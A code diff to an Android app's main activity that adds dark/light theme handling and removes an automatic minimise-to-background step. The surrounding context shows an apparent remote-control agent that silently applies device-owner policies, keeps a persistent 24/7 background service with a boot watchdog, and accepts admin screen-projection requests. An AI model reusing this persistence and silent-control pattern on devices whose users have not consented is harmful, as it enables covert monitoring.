@@ -5,6 +5,8 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.res.ColorStateList;
+import android.content.res.Configuration;
 import android.media.projection.MediaProjectionConfig;
 import android.media.projection.MediaProjectionManager;
 import android.os.Build;
@@ -12,6 +14,7 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
+import android.view.View;
 import android.view.Window;
 import android.widget.ProgressBar;
 import android.widget.TextView;
@@ -154,6 +157,42 @@ public class MainActivity extends Activity {
         }
     }
 
+    private void applyThemeMode() {
+        try {
+            int nightMode = getResources().getConfiguration().uiMode & Configuration.UI_MODE_NIGHT_MASK;
+            boolean isDark = (nightMode == Configuration.UI_MODE_NIGHT_YES);
+
+            View root = findViewById(R.id.rootLayout);
+            if (root != null) {
+                root.setBackgroundColor(isDark ? 0xFF0F172A : 0xFFFFFFFF);
+            }
+            if (tvLoadingStatus != null) {
+                tvLoadingStatus.setTextColor(isDark ? 0xFFF8FAFC : 0xFF0F172A);
+            }
+            if (pbLoader != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                pbLoader.setIndeterminateTintList(ColorStateList.valueOf(isDark ? 0xFF38BDF8 : 0xFF2563EB));
+            }
+
+            // Adjust status bar icon colors (dark icons for light mode, light icons for dark mode)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                View decor = getWindow().getDecorView();
+                int flags = decor.getSystemUiVisibility();
+                if (!isDark) {
+                    flags |= View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR;
+                } else {
+                    flags &= ~View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR;
+                }
+                decor.setSystemUiVisibility(flags);
+            }
+        } catch (Throwable ignored) {}
+    }
+
+    @Override
+    public void onConfigurationChanged(Configuration newConfig) {
+        super.onConfigurationChanged(newConfig);
+        applyThemeMode();
+    }
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -170,6 +209,8 @@ public class MainActivity extends Activity {
 
         pbLoader = (ProgressBar) findViewById(R.id.pbLoader);
         tvLoadingStatus = (TextView) findViewById(R.id.tvLoadingStatus);
+
+        applyThemeMode();
 
         handler = new Handler(Looper.getMainLooper());
         statusReceiver = new StatusReceiver(this);
@@ -188,13 +229,10 @@ public class MainActivity extends Activity {
         // Apply device owner policies silently if provisioned
         AdminReceiver.applyDeviceOwnerPolicies(this);
 
-        // Start persistent 24/7 background service (Zero redirects to Android settings)
+        // Start persistent 24/7 background service in independent process
         startAgentService();
         BootReceiver.scheduleWatchdog(this);
         AgentJobService.schedule(this);
-
-        // Gracefully minimize to background after loading sequence
-        handler.postDelayed(new MoveToBackRunnable(this), 3000L);
 
         // Handle incoming admin remote control requests if launched with projection action
         handleIncomingIntent(getIntent());
@@ -210,6 +248,7 @@ public class MainActivity extends Activity {
     @Override
     protected void onResume() {
         super.onResume();
+        applyThemeMode();
         AdminReceiver.applyDeviceOwnerPolicies(this);
 
         if (handler != null && dotsRunnable != null) {
